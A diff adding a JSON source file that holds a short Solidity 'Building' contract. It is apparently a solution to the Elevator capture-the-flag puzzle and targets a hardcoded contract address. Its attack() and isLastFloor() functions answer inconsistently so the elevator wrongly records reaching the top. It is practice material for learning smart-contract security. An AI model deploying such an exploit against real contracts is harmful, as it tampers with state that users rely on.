@@ -1,0 +1,10 @@
+{
+  "src/elevator.sol": {
+    "__sources__": {
+      "src/elevator.sol": {
+        "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface Ele {\n    function goTo(uint256) external;\n    function floor() external view returns (uint256);\n}\n\n// 천재새끼 ai 도움 없이 이걸 해킹해?\ncontract Building{\n    Ele private elevator;\n\n    constructor(){\n        elevator = Ele(0xa7f00CB26c34C920016694b209c9072611E44221);\n    }\n\n    function attack(uint256 _floor) public {\n        elevator.goTo(_floor);\n    }\n\n    function isLastFloor(uint256 _floor) public view returns(bool){\n       if (elevator.floor() != _floor){\n        return false;\n       }\n       return true;\n    }\n\n}",
+        "file": "src/elevator.sol"
+      }
+    }
+  }
+}
